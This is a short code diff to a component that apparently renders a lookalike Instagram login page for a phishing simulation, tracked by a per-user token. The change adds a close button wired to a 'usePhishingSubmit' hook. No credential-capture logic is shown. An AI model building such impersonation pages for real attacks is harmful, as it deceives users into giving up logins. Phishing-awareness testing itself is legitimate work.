@@ -1,12 +1,14 @@
 "use client";
 
 import { usePhishingSubmit } from "./usePhishingSubmit";
+import { PhishingCloseButton } from "./PhishingCloseButton";
 
 export default function InstagramLogin({ token }: { token: string }) {
-  const { loading, handleSubmit } = usePhishingSubmit(token);
+  const { loading, handleSubmit, handleClose } = usePhishingSubmit(token);
 
   return (
     <div className="min-h-screen bg-white flex flex-col items-center justify-center">
+      <PhishingCloseButton onClose={handleClose} />
       <div className="flex flex-col lg:flex-row items-center gap-8 lg:gap-16 max-w-[935px] w-full px-4">
         {/* Left side - branding */}
         <div className="hidden lg:block lg:flex-1 text-center">
